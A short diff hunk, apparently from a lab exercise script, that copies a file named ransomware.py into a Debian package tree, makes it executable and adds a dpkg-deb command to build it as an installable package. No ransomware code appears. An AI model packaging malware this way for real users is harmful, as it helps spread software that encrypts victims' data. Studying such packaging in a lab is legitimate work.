@@ -25,3 +25,5 @@ Categories=Languages;Python;
 cp ex2/ransomware.py ransomwar-0.0.1/usr/bin/ransomware
 cd ransomwar-0.0.1/usr/bin/
 sudo chmod +x ransomware 
+
+dpkg-deb --build --root-owner-group ransomwar-0.0.1/
